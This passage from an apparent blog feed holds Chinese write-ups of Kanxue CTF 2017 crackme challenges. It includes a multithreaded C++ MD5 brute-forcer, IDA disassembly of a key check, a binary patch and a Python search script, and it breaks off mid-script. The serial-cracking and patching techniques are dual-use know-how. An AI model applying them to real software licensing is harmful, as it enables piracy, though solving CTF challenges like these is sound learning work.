&apos;y&apos;, &apos;z&apos;,</span><br><span class="line"> &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;,</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line">#define SEED_SIZE 36// 68</span><br><span class="line"></span><br><span class="line">typedef struct _THREAD_PARAM</span><br><span class="line">&#123;</span><br><span class="line"> int i1;</span><br><span class="line"> int i2;</span><br><span class="line"> int i3;</span><br><span class="line"> int i2_1;</span><br><span class="line"> int i2_2;</span><br><span class="line">&#125;TPP, *PTPP;</span><br><span class="line"></span><br><span class="line">int g_ThreadCnt = 0;</span><br><span class="line">int g_start = 0;</span><br><span class="line">long g_count = 0;</span><br><span class="line"></span><br><span class="line">void write_file(char* sz)</span><br><span class="line">&#123;</span><br><span class="line"> HANDLE hFile = CreateFileA(&quot;1.log&quot;, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);</span><br><span class="line"> if(hFile)</span><br><span class="line"> &#123;</span><br><span class="line">  SetFilePointer(hFile, 0, 0, FILE_END);</span><br><span class="line">  DWORD dw = 0;</span><br><span class="line">  WriteFile(hFile, sz, strlen(sz), &amp;dw, NULL);</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  hFile = NULL;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool crack1(PTPP p)</span><br><span class="line">&#123;</span><br><span class="line"> int i1 = p-&gt;i1;</span><br><span class="line"> int i2 = p-&gt;i2;</span><br><span class="line"></span><br><span class="line"> char sss[20] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line"> for(int i3=0; i3&lt;SEED_SIZE; i3++)</span><br><span class="line"> &#123;</span><br><span class="line">  for(int i4=0; i4&lt;SEED_SIZE; i4++)</span><br><span class="line">  &#123;</span><br><span class="line">   for(int i5=0; i5&lt;SEED_SIZE; i5++)</span><br><span class="line">   &#123;</span><br><span class="line">    for(int i6=0; i6&lt;SEED_SIZE; i6++)</span><br><span class="line">    &#123;</span><br><span class="line">     char sza[7] = &#123;Seed[i1], Seed[i2], Seed[i3], Seed[i4], Seed[i5], Seed[i5]&#125;;</span><br><span class="line"></span><br><span class="line">     g_count ++;</span><br><span class="line"></span><br><span class="line">     char sz[7] = &#123;0&#125;;</span><br><span class="line">     //反转</span><br><span class="line">     sz[0] = Seed[i6]+1;</span><br><span class="line">     sz[1] = Seed[i5]+1;</span><br><span class="line">     sz[2] = Seed[i4]+2;</span><br><span class="line">     sz[3] = Seed[i3]+3;</span><br><span class="line">     sz[4] = Seed[i2]+4;</span><br><span class="line">     sz[5] = Seed[i1]+5;</span><br><span class="line"></span><br><span class="line">     FileMD5 fm;</span><br><span class="line">     char* p = (char*)fm.md5(sz, 6);</span><br><span class="line">     p = (char*)fm.md5(p, 32);</span><br><span class="line">     strncpy(sss, p+2, 10);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     if(!stricmp(sss, &quot;888aeda4ab&quot;))</span><br><span class="line">     &#123;</span><br><span class="line">      char info[1024] = &#123;0&#125;;</span><br><span class="line">      sprintf(info, &quot;%c%c%c%c%c%c, =&gt; %s，%s\n&quot;, </span><br><span class="line">       Seed[i1], Seed[i2], Seed[i3], Seed[i4], Seed[i5], Seed[i6], </span><br><span class="line">       sz,</span><br><span class="line">       sss</span><br><span class="line">       );</span><br><span class="line">      write_file(info);</span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">      int spell = GetTickCount() - g_start;</span><br><span class="line">      printf(&quot;spell time : %d s&quot;, spell/1000);</span><br><span class="line"></span><br><span class="line">      system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">      return true;</span><br><span class="line">     &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   //system(&quot;cls&quot;);</span><br><span class="line">   printf(&quot;count: %ld\n&quot;, g_count);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> return false;</span><br><span class="line">&#125;</span><br><span class="line">void crack3(PTPP p)</span><br><span class="line">&#123;</span><br><span class="line"> int i1 = p-&gt;i1;</span><br><span class="line"> int i2_1 = p-&gt;i2_1;</span><br><span class="line"> int i2_2 = p-&gt;i2_2;</span><br><span class="line"></span><br><span class="line"> delete[] p;</span><br><span class="line"></span><br><span class="line"> TPP p1 = &#123;0&#125;;</span><br><span class="line"> p1.i1 = i1;</span><br><span class="line"> for(int i=i2_1; i&lt;i2_2; i++)</span><br><span class="line"> &#123;</span><br><span class="line">  p1.i2 = i;</span><br><span class="line">  if(crack1(&amp;p1))</span><br><span class="line">  &#123;</span><br><span class="line">   return;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">void crack2(int i1, int i2_1, int i2_2)</span><br><span class="line">&#123;</span><br><span class="line"> PTPP p = new TPP;//&#123;0&#125;;</span><br><span class="line"> if(p == NULL)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;!!!!!!!!!!!!没neicun！！&quot;);</span><br><span class="line">  return;</span><br><span class="line"> &#125;</span><br><span class="line"> memset(p, 0, sizeof(TPP));</span><br><span class="line"> p-&gt;i1 = i1;</span><br><span class="line"> p-&gt;i2_1 = i2_1;</span><br><span class="line"> p-&gt;i2_2 = i2_2;</span><br><span class="line"> </span><br><span class="line"> HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)crack3, (PVOID)p, 0, NULL);</span><br><span class="line"> if(h == NULL)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;CreateTHREAD error [%d]\n&quot;, g_ThreadCnt);</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">  g_Handles[g_ThreadCnt++] = h;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void crack()</span><br><span class="line">&#123;</span><br><span class="line"> for(int i1=0; i1&lt;SEED_SIZE; i1++)</span><br><span class="line"> &#123;</span><br><span class="line">  int i2 = 0;</span><br><span class="line">#define STEP_SIZE 2</span><br><span class="line">  for(i2 = 0; i2&lt;SEED_SIZE-STEP_SIZE; i2+=STEP_SIZE)</span><br><span class="line">  &#123;</span><br><span class="line">   crack2(i1, i2, i2+STEP_SIZE);</span><br><span class="line">  &#125;</span><br><span class="line">  crack2(i1, i2, SEED_SIZE);</span><br><span class="line"> &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"> int start = GetTickCount();</span><br><span class="line"> g_start = GetTickCount();</span><br><span class="line"></span><br><span class="line"> crack();</span><br><span class="line"></span><br><span class="line"> WaitForMultipleObjects(g_ThreadCnt, g_Handles, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line"> int spell = GetTickCount() - start;</span><br><span class="line"> printf(&quot;spell time : %d s, thread-count: %d\n&quot;, spell, g_ThreadCnt);</span><br><span class="line"></span><br><span class="line"> getchar();</span><br><span class="line"></span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p> <p>最后结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su1986, =&gt; 79;4yx，888aeda4ab</span><br></pre></td></tr></table></figure></p> <p>由于算法开始有转小写，所以其时答案中所有字母都可以是大小写选择，答案不唯一。</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/kxctf2017-writeup5">https://anhkgg.github.io/kxctf2017-writeup5</a></p> ]]></content>          <summary type="html">            &lt;p&gt;题目入口：&lt;a href=&quot;http://ctf.pediy.com/game-fight-35.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ctf.pediy.com/game-fight-35.htm&lt;/a&gt;，可下载相关文件&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;本题需要在XP系统运行，因为驱动只支持xp&lt;/p&gt; &lt;/blockquote&gt; &lt;h1 id=&quot;00-先看驱动&quot;&gt;&lt;a href=&quot;#00-先看驱动&quot; class=&quot;headerlink&quot; title=&quot;00. 先看驱动&quot;&gt;&lt;/a&gt;00. 先看驱动&lt;/h1&gt;&lt;p&gt;驱动不大，才20多个函数。&lt;/p&gt; &lt;p&gt;从入口开始分析。&lt;/p&gt; &lt;h2 id=&quot;1-创建设备&quot;&gt;&lt;a href=&quot;#1-创建设备&quot; class=&quot;headerlink&quot; title=&quot;1. 创建设备&quot;&gt;&lt;/a&gt;1. 创建设备&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.text:000107D5 68 58 13 01 00                                                  push    offset aDeviceVmxdrv ; &amp;quot;\\device\\vmxdrv&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:000107DA 8D 45 F4                                                        lea     eax, [ebp+DestinationString]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:000107DD 33 FF                                                           xor     edi, edi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:000107DF 50                                                              push    eax             ; DestinationString&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:000107E0 89 7D FC                                                        mov     [ebp+DeviceObject], edi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:000107E3 FF D6                                                           call    esi ; RtlInitUnicodeString&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;          </summary>            <category term="ctf" scheme="https://anhkgg.github.io/categories/ctf/"/>                 <category term="ctf" scheme="https://anhkgg.github.io/tags/ctf/"/>            <category term="writeup" scheme="https://anhkgg.github.io/tags/writeup/"/>            <category term="看雪" scheme="https://anhkgg.github.io/tags/%E7%9C%8B%E9%9B%AA/"/>            <category term="kanxue" scheme="https://anhkgg.github.io/tags/kanxue/"/>            <category term="bbs.pediy.com" scheme="https://anhkgg.github.io/tags/bbs-pediy-com/"/>            <category term="crackme" scheme="https://anhkgg.github.io/tags/crackme/"/>        </entry>      <entry>     <title>看雪CTF2017第二题lelfeiCM的writeup</title>     <link href="https://anhkgg.github.io/kxctf2017_writeup2/"/>     <id>https://anhkgg.github.io/kxctf2017_writeup2/</id>     <published>2017-06-11T00:36:27.000Z</published>     <updated>2017-06-14T01:45:43.028Z</updated>          <content type="html"><![CDATA[<p>题目入口：<a href="http://ctf.pediy.com/game-fight-32.htm" target="_blank" rel="noopener">http://ctf.pediy.com/game-fight-32.htm</a>，可下载相关文件</p> <h1 id="0-定位算法位置"><a href="#0-定位算法位置" class="headerlink" title="0. 定位算法位置"></a>0. 定位算法位置</h1><p>由于是console程序，并且没有隐藏字符串，通过OD/IDA找到关键字符串，所在函数就是关键算法函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:00409058 aWellDone       db &apos;WELL DONE!&apos;,0Ah,0   ; DATA XREF: _main:loc_401257o</span><br><span class="line">.data:00409064 aWrongKey___    db &apos;WRONG KEY...&apos;,0Ah,0 ; DATA XREF: _main+231o</span><br><span class="line">.data:00409072                 align 4</span><br><span class="line">.data:00409074 aKeyFormatError db &apos;key format error...&apos;,0Ah,0 ; DATA XREF: _main+9Ao</span><br></pre></td></tr></table></figure></p> <a id="more"></a> <p>其实就在main函数中，然后看获取输入之后干了什么。<br>首先检查输入长度是不是在8到20之间，不是提示key len error<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00401066                 cmp     ecx, 8</span><br><span class="line">.text:00401069                 jl      loc_40127A</span><br><span class="line">.text:0040106F                 cmp     ecx, 14h</span><br><span class="line">.text:00401072                 jg      loc_40127A</span><br><span class="line">.text:00401078                 xor     esi, esi</span><br><span class="line">.text:0040107A                 xor     edx, edx</span><br><span class="line">.text:0040107C                 test    ecx, ecx</span><br></pre></td></tr></table></figure></p> <p>是不是都是数值，不是就提示key format error…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:00401082                 jle     short loc_4010AC</span><br><span class="line">.text:00401084</span><br><span class="line">.text:00401084 loc_401084:                             ; CODE XREF: _main+94j</span><br><span class="line">.text:00401084                 mov     al, [esp+edx+4138h+key]</span><br><span class="line">.text:00401088                 cmp     al, 30h</span><br><span class="line">.text:0040108A                 jle     short loc_401090</span><br><span class="line">.text:0040108C                 cmp     al, 39h</span><br><span class="line">.text:0040108E                 jle     short loc_401091</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 loc_401090:                             ; CODE XREF: _main+8Aj</span><br><span class="line">.text:00401090                 inc     esi</span><br><span class="line">.text:00401091</span><br><span class="line">.text:00401091 loc_401091:                             ; CODE XREF: _main+8Ej</span><br><span class="line">.text:00401091                 inc     edx</span><br><span class="line">.text:00401092                 cmp     edx, ecx</span><br><span class="line">.text:00401094                 jl      short loc_401084</span><br><span class="line">.text:00401096                 test    esi, esi</span><br><span class="line">.text:00401098                 jz      short loc_4010AC</span><br><span class="line">.text:0040109A                 push    offset aKeyFormatError ; &quot;key format error...\n&quot;</span><br><span class="line">.text:0040109F                 call    f_printf_401BE0</span><br></pre></td></tr></table></figure></p> <p>下面接着就是算法的重要部分了，一看到下面的函数，就知道有点小类结构了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:004012C0 ; KEY_OBJ1 *__thiscall f_keyobj_init_4012C0(KEY_OBJ1 *this)</span><br><span class="line">.text:004012C0 f_keyobj_init_4012C0 proc near          ; CODE XREF: _main+B3 p</span><br><span class="line">.text:004012C0                                         ; f_keyobj_calc_mul_401730+29p ...</span><br><span class="line">.text:004012C0                 push    esi</span><br><span class="line">.text:004012C1                 mov     esi, ecx</span><br><span class="line">.text:004012C3                 mov     dword ptr [esi], offset off_4080C8</span><br><span class="line">.text:004012C9                 call    ds:GetTickCount</span><br><span class="line">.text:004012CF                 mov     ecx, esi</span><br><span class="line">.text:004012D1                 mov     [esi+200Ch], eax</span><br><span class="line">.text:004012D7                 mov     [esi+2008h], eax</span><br><span class="line">.text:004012DD                 call    f_keyobj_init_seed1_401A60</span><br><span class="line">.text:004012E2                 mov     eax, esi</span><br><span class="line">.text:004012E4                 pop     esi</span><br><span class="line">.text:004012E5                 retn</span><br><span class="line">.text:004012E5 f_keyobj_init_4012C0 endp</span><br></pre></td></tr></table></figure></p> <h1 id="1-算法类结构分析，各类函数的功能分析"><a href="#1-算法类结构分析，各类函数的功能分析" class="headerlink" title="1. 算法类结构分析，各类函数的功能分析"></a>1. 算法类结构分析，各类函数的功能分析</h1><p>先把类结构大致整理出来，方便后续分析</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000 KEY_OBJ1        struc ; (sizeof=0x2010) ; XREF: _mainr</span><br><span class="line">00000000                                         ; f_keyobj_calc_mul_401730r</span><br><span class="line">00000000 vtable_4080C8   dd ?</span><br><span class="line">00000004 cur_calc_pos    dd ? //结果长度</span><br><span class="line">00000008 seed_array_1024_1 dd 1024 dup(?) //保存key的值</span><br><span class="line">00001008 seed_array_1024 dd 1024 dup(?) //保存序号</span><br><span class="line">00002008 TickCnt_key_seed dd ?</span><br><span class="line">0000200C TickCnt1        dd ?</span><br><span class="line">00002010 KEY_OBJ1        ends</span><br></pre></td></tr></table></figure> <p>然后就是几个关键函数：</p> <p>1.1 初始化数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00401A60 ; char *__thiscall f_keyobj_init_seed1_401A60(KEY_OBJ1 *this)</span><br><span class="line">...</span><br><span class="line">.text:00401A8F                 call    f_kyeobj_getindex_4019E0 //更加GetTickCount获取随机index，用于打乱序号的顺序增加分析难度</span><br><span class="line">...</span><br><span class="line">.text:00401ABA                 mov     esi, [ecx]</span><br><span class="line">.text:00401ABC                 sub     ecx, 4</span><br><span class="line">.text:00401ABF                 mov     [eax], esi</span><br><span class="line">.text:00401AC1                 add     eax, 4</span><br><span class="line">.text:00401AC4                 dec     edx</span><br></pre></td></tr></table></figure></p> <p>这个地方首先就想到了每次GetTickCount不一样，那么算法怎么保证结果相同呢，便想到肯定跟index顺序无关，后面验证果然是，我就把401A60给patch了一下，然初始化的序号结构没有打乱顺序，保持0-0x3ff，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//nop了00401A8F调用的循环部分                 </span><br><span class="line">.text:00401A8F                 call    f_kyeobj_getindex_4019E0 </span><br><span class="line">//这里其实就是seed_array_1024[1023]，不让它倒过来赋值，修改为lea     ecx, [esi+1008h]</span><br><span class="line">.text:00401AAE                 lea     ecx, [esi+2004h]</span><br></pre></td></tr></table></figure></p> <p>这样之后，就可以很方便查看数据变换，观察这两个字段即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000004 cur_calc_pos    dd ? //结果长度</span><br><span class="line">00000008 seed_array_1024_1 dd 1024 dup(?) //保存key的值</span><br></pre></td></tr></table></figure></p> <p>后面所有相关函数中有关index转换的也不用关注，因为他变来变去都是0-0x3ff，就只需要关注具体数据操作了。<br>然后其他函数功能分析也就简单了。<br>下面简单列一下，不做详细说明了（很简单，就是数组操作过来过去的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:004014E0 ; int __thiscall f_keyojb_key1_4014E0(void *this, const char *key) //将输入的key保存到seed_array_1024_1 中，字符转为数值，每个值存一个dword</span><br><span class="line">.text:00401970 ; void __thiscall f_keyobj_key1_s2_401970(KEY_OBJ1 *this) //数值大于10，取余存当前index位置，取商和index+1位置求和保存，其实就是进位处理（后面才醒悟）</span><br><span class="line">.text:00401730 ; signed int __userpurge f_keyobj_calc_mul_401730@&lt;eax&gt;(int a1@&lt;eax&gt;, int keyobj0@&lt;ecx&gt;, signed int a3)//用a3取商做右位移，a3取余做加法，其实就是做乘法运算</span><br><span class="line">text:00401840 ; signed int __userpurge f_keyobj_mul2_401840@&lt;eax&gt;(int a1@&lt;eax&gt;, int a2@&lt;ecx&gt;, KEY_OBJ1 *a3)//两个KEY_OBJ做乘法</span><br></pre></td></tr></table></figure></p> <h1 id="2-醒悟算法究竟是个什么玩意"><a href="#2-醒悟算法究竟是个什么玩意" class="headerlink" title="2. 醒悟算法究竟是个什么玩意"></a>2. 醒悟算法究竟是个什么玩意</h1><p>输入的key关键处理部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004010E0                 push    9</span><br><span class="line">.text:004010E2                 lea     ecx, [esp+413Ch+keyobj]</span><br><span class="line">.text:004010E9                 call    f_keyobj_calc_mul_401730 ;</span><br><span class="line">...</span><br><span class="line">.text:0040110B                 lea     eax, [esp+4138h+keyobj1]</span><br><span class="line">.text:00401112                 lea     ecx, [esp+4138h+keyobj]</span><br><span class="line">.text:00401119                 push    eax</span><br><span class="line">.text:0040111A                 mov     byte ptr [esp+413Ch+var_4], 1</span><br><span class="line">.text:00401122                 call    f_keyobj_mul2_401840</span><br><span class="line">...</span><br><span class="line">.text:00401127                 push    9</span><br><span class="line">.text:00401129                 lea     ecx, [esp+413Ch+keyobj]</span><br><span class="line">.text:00401130                 mov     esi, eax</span><br><span class="line">.text:00401132                 call    f_keyobj_calc_mul_401730 ;</span><br></pre></td></tr></table></figure></p> <p>先前想着输入的key用9做位移，做加法，干么呢…一直绕不清，后来重新看f_keyobj_key1_s2_401970，觉得是进位处理，一下子就灵光了，这是实现乘法运算（1024位的乘法，真实折腾，nb）。<br>这样算法也基本清楚了。<br>key<em>9</em>key<em>9</em>(…) =&gt; result</p> <p>怎么校验的呢？</p> <ol> <li>计算结果长度必须是奇数</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00401154                 call    f_keyobj_curpos_4013A0</span><br><span class="line">.text:00401159                 and     eax, 80000001h</span><br><span class="line">.text:0040115E                 jns     short loc_401165</span><br><span class="line">.text:00401160                 dec     eax</span><br><span class="line">.text:00401161                 or      eax, 0FFFFFFFEh</span><br><span class="line">.text:00401164                 inc     eax</span><br><span class="line">.text:00401165</span><br><span class="line">.text:00401165 loc_401165:                             ; CODE XREF: _main+15E</span><br><span class="line">.text:00401165                 cmp     eax, 1</span><br></pre></td></tr></table></figure> <ol> <li>result[len/2] == key[0]</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401175                 call    f_keyobj_curpos_4013A0</span><br><span class="line">.text:0040117A                 sar     eax, 1</span><br><span class="line">.text:0040117C                 push    eax</span><br><span class="line">.text:0040117D                 lea     ecx, [esp+413Ch+keyobj]</span><br><span class="line">.text:00401184                 call    f_keyobj_check1_4013B0</span><br><span class="line">.text:00401189                 push    0</span><br><span class="line">.text:0040118B                 lea     ecx, [esp+413Ch+keyobj1]</span><br><span class="line">.text:00401192                 mov     edi, eax</span><br><span class="line">.text:00401194                 call    f_keyobj_check1_4013B0</span><br><span class="line">.text:00401199                 cmp     edi, eax</span><br><span class="line">.text:0040119B                 lea     ecx, [esp+4138h+keyobj1]</span><br><span class="line">.text:004011A2                 jnz     short loc_40121C</span><br></pre></td></tr></table></figure> <ol> <li>高位部分和key相同（跳过比较那个字节）</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:004011D0                 lea     ecx, [esp+4144h+keyobj1]</span><br><span class="line">.text:004011D7                 push    esi</span><br><span class="line">.text:004011D8                 push    ecx</span><br><span class="line">.text:004011D9                 lea     ecx, [esp+414Ch+keyobj]</span><br><span class="line">.text:004011E0                 call    f_keyobj_check2_4013E0</span><br></pre></td></tr></table></figure> <ol> <li>低位部分和key逆序（跳过比较那个字节）</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text:004011F6                 lea     edx, [esp+413Ch+keyobj1]</span><br><span class="line">.text:004011FD                 push    eax</span><br><span class="line">.text:004011FE                 push    1</span><br><span class="line">.text:00401200                 push    0</span><br><span class="line">.text:00401202                 push    edx</span><br><span class="line">.text:00401203                 lea     ecx, [esp+414Ch+keyobj]</span><br><span class="line">.text:0040120A                 call    f_keyobj_check2_4013E0</span><br></pre></td></tr></table></figure> <p>感觉结果应该是这一个样子的：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1234567-&gt;1234567654321 //中间因为长度折腾了好久，后面查了才知道这是回文数，翻半天没有什么算法，脚本已经跑起来了</span><br></pre></td></tr></table></figure> <p>怎么求逆呢？算法不好，那就脚本跑吧！</p> <h1 id="3-脚本跑"><a href="#3-脚本跑" class="headerlink" title="3. 脚本跑"></a>3. 脚本跑</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">i = 11111111#</span><br><span class="line">while True:</span><br><span class="line">    break</span><br><span class="line">    is1 = str(i)</span><br><span class="line">    is2_len = len(is1) </span><br><span class="line">    </span><br><span class="line">    is1 = is1[:is2_len-1]</span><br><span class="line">    is2 = is1[::-1]</span><br><span class="line">    </span><br><span class="line">    k = i*9*9*i</span><br><span class="line">        </span><br><span class="line">    ks1 = &apos;&apos;</span><br><span class="line">    ks = &apos;&apos;</span><br><span class="line">    while True:</span><br><span class="line">       </span><br><span class="line">        #print i, k</span><br><span class="line">        #break</span><br><span class="line">        ks1 = str(k)</span><br><span class="line">        </span><br><span class="line">        lll = len(ks1)/2</span><br><span class="line">        </span><br><span class="line">        if len(ks1) &gt; 2*is2_len:</span><br><span class="line">            #print &apos;long out - 1&apos;, i, len(ks1), 2*is2_len</span><br><span class="line">            break</span><br><span class="line">        </span><br><span class="line">        if (is2_len + len(ks1))&gt;1024:</span><br><span class="line">            #print &apos;long out - 1&apos;, i, is2_len + len(ks1)</span><br><span class="line">            break</span><br><span class="line">        </span><br><span class="line">        if (len(ks1)%2!=0) and (is1[0:1] == ks1[lll:lll+1]):</span><br><span class="line">            print  &apos;get -success1 &gt; &apos;, i, is1, k</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        if len(ks1)&gt;1024:</span><br><span class="line">            #print &apos;long out&apos;, i</span><br><span class="line">            break </span><br><span class="line">        </span><br><span class="line">        k = k * i*9</span><br><span class="line"></span><br><span class="line">    ls2_len1 = is2_len-1</span><br><span class="line">    ks = ks1[:ls2_len1]</span><br><span class="line">    </span><br><span class="line">    if ((is1 == ks) and (is2 == ks1[(-1*ls2_len1):])):</span><br><span class="line">        print  &apos;get -success &gt; &apos;, i, is1, k</span><br><span class="line">        print &apos;&apos;</span><br><span class="line">    </span><br><span class="line">    i += 1</span><br><span class="line">    </span><br><span class="line">    if i % 10000000 == 